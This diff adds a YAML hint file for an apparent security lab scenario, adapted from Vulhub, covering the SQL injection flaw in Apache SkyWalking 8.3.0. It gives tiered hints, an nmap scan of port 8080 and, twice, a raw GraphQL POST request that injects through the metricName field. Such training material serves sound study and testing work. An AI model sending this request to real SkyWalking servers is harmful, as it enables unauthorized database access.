@@ -1,0 +1,141 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: skywalking/8.3.0-sqli
+hint_levels:
+  low:
+  - Inspect the skywalking service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8080/tcp → container 8080/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
+  high:
+  - 'Vulnerability: Apache Skywalking 8.3.0 SQL Injection Vulnerability.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    POC
+
+    I use GraphiQL's desktop app to send the following GraphQL query:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/skywalking/8.3.0-sqli/1.png
+
+    It can be seen that the SQL statement has raised error, and the value of the `metricName` parameter has been injected ​​after `from`.
+
+    The HTTP request of this GraphQL query is:
+
+    ```
+    POST /graphql HTTP/1.1
+    Host: {{NODE_IP}}:8080
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+    Connection: close
+    Content-Type: application/json
+
+    {
+        "query":"query queryLogs($condition: LogQueryCondition) {
+      queryLogs(condition: $condition) {
+        total
+        logs {
+          serviceId
+          serviceName
+          isError
+          content
+        }
+      }
+    }
+    ",
+        "variables":{
+            "condition":{
+                "metricName":"sqli",
+                "state":"ALL",
+                "paging":{
+                    "pageSize":10
+                }
+            }
+        }
+    }
+    ```
+
+    For more in-depth exploit, you can research by yourself, and welcome to submit PR to us.
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/skywalking/8.3.0-sqli/README.md'
+  - |-
+    Additional public references:
+    - https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw
+    - https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c
+access_instructions:
+  title: Apache Skywalking 8.3.0 SQL Injection Vulnerability
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080`.
+  - title: POC
+    instructions: |-
+      I use GraphiQL's desktop app to send the following GraphQL query:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/skywalking/8.3.0-sqli/1.png
+
+      It can be seen that the SQL statement has raised error, and the value of the `metricName` parameter has been injected ​​after `from`.
+
+      The HTTP request of this GraphQL query is:
+
+      ```
+      POST /graphql HTTP/1.1
+      Host: {{NODE_IP}}:8080
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Accept-Language: en
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+      Connection: close
+      Content-Type: application/json
+
+      {
+          "query":"query queryLogs($condition: LogQueryCondition) {
+        queryLogs(condition: $condition) {
+          total
+          logs {
+            serviceId
+            serviceName
+            isError
+            content
+          }
+        }
+      }
+      ",
+          "variables":{
+              "condition":{
+                  "metricName":"sqli",
+                  "state":"ALL",
+                  "paging":{
+                      "pageSize":10
+                  }
+              }
+          }
+      }
+      ```
+
+      For more in-depth exploit, you can research by yourself, and welcome to submit PR to us.
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/skywalking/8.3.0-sqli/README.md
+  readme_sha256: 9093ad96822faf7b0b0279820a37ee102e20e69710178cf679c507dbcae91837
+  compose_sha256: 0c5b8059c7989748bb8f1da5011c534e75871b91a28d92838d62276ed7909feb
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
